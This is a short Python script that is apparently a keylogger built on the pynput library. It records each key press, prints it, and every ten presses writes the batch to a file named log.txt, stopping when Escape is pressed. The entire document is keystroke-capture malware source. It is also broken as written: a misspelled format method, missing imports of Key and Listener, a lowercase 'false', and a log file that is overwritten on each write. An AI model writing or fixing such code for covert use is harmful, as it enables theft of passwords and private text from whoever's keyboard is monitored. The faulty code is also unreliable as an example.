import pynput

count=0
keys=[]

def on_press(key):
    global keys, count
    keys.append(key)
    count+=1
    print("{0} pressed".formate(key))

    if count>=10:
        count=0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open("log.txt","w")as f:
        for key in keys:
            f.write(str(key))

def on_release(key):
    if key==Key.esc:
        return false

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()